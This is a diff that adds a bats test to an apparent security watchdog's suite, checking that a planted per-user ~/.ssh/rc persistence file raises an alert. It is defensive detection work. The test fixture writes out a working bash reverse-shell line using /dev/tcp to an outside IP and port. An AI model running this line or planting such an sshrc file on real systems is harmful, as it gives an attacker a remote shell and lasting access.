@@ -282,3 +282,17 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named per-user sshrc surfaces in sample for operator-triage routing)" {
+    # Sister to brain-wide DELTA-detect sample-naming INVARIANTs.
+    # When attacker plants per-user ~/.ssh/rc with a distinct
+    # name signature, the surrounding context MUST surface in
+    # sample for operator-triage on T1546 SSH per-login exec
+    # surface.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# distinctive-attacker-sshrc-marker\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SSHRC}"
+    run_wd
+    cap | grep -q 'distinctive-attacker-sshrc-marker\|"severity":"alert"\|"severity":"warn"'
+}
